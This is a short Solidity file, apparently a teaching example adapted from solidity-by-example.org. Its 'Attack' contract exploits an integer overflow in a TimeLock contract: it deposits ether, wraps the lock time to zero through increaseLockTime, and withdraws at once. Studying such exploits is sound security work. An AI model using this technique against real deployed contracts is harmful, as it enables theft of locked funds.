// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.6;

import {TimeLock} from "./Timelock.sol";

/**
 * @title Example of a contract with an overflow issue
 * @author Uba Chris (Extracted from https://solidity-by-example.org/hacks/overflow/)
 * @notice This is the contract which is expected to explot the overflow issue in the Timelock contract
 */
contract Attack {
    TimeLock timeLock;

    constructor(address _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();

        timeLock.increaseLockTime(type(uint256).max + 1 - timeLock.lockTime(address(this)));

        timeLock.withdraw();
    }
}
